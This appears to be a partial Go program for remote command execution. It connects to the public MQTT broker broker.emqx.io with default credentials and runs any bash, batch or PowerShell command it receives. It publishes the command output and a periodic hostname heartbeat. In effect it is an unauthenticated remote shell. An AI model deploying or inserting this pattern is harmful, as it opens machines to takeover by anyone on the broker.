// author: andy.hu
// email:andy.hu.sheng@gmail.com
// date: 2024/1/5 16:11
// version: v1.0
// change log: 1.UPDATE AAAA BBBB MD5 VALUE

package main

import (
	"encoding/json"
	"fmt"
	"runtime"
	"time"

	mqtt "github.com/eclipse/paho.mqtt.golang"
)

type Message struct {
	OS      string
	Type    string
	Command string
}

var messagePubHandler mqtt.MessageHandler = func(client mqtt.Client, msg mqtt.Message) {
	var message Message
	err := json.Unmarshal(msg.Payload(), &message)
	if err != nil {
		fmt.Println("error:", err)
		return
	}

	// HANDLER for OS:

	if runtime.GOOS == message.OS {
		switch T := message.Type; T {
		case "bat":
			go func() {
				output := call_bat(message)
				publish_log(client, output)
			}()
		case "powershell":
			if runtime.GOOS == "windows" {
				go func() {
					output := call_powershell(message)
					publish_log(client, output)
				}()
			}
		case "pwsh":
			go func() {
				output := call_pwsh(message)
				publish_log(client, output)
			}()
		case "bat_script":
			if runtime.GOOS == "windows" {
				go func() {
					output := call_batscript(message)
					publish_log(client, output)
				}()
			}
		case "powershell_script":
			if runtime.GOOS == "windows" {
				go func() {
					output := call_powershell_script(message)
					publish_log(client, output)
				}()
			}
		case "pwsh_script":
			if runtime.GOOS == "windows" {
				go func() {
					output := call_pwsh_script(message)
					publish_log(client, output)
				}()
			}
		case "bash":
			go func() {
				output := call_bash(message)
				publish_log(client, output)
			}()
		case "bash_script":
			go func() {
				output := call_bash_script(message)
				publish_log(client, output)
			}()
		default:
			publish_log(client, message.Type+" is not support")

		}
	}
}

func main() {
	var broker = "broker.emqx.io"
	var port = 1883
	opts := mqtt.NewClientOptions()
	opts.AddBroker(fmt.Sprintf("tcp://%s:%d", broker, port))
	opts.SetClientID(random_string())
	opts.SetUsername("emqx")
	opts.SetPassword("public")
	opts.SetDefaultPublishHandler(messagePubHandler)
	opts.OnConnect = connectHandler
	opts.OnConnectionLost = connectLostHandler
	client := mqtt.NewClient(opts)
	if token := client.Connect(); token.Wait() && token.Error() != nil {
		panic(token.Error())
	}
	subscript_opera(client)
	for {
		now := time.Now()
		publish_live(client, fmt.Sprintf("Time:%s,Hostname:%s is alive", now.Format("2006-01-02 15:04:05"), get_hostname()))
		time.Sleep(30 * time.Second)
		subscript_opera(client)
	}
}
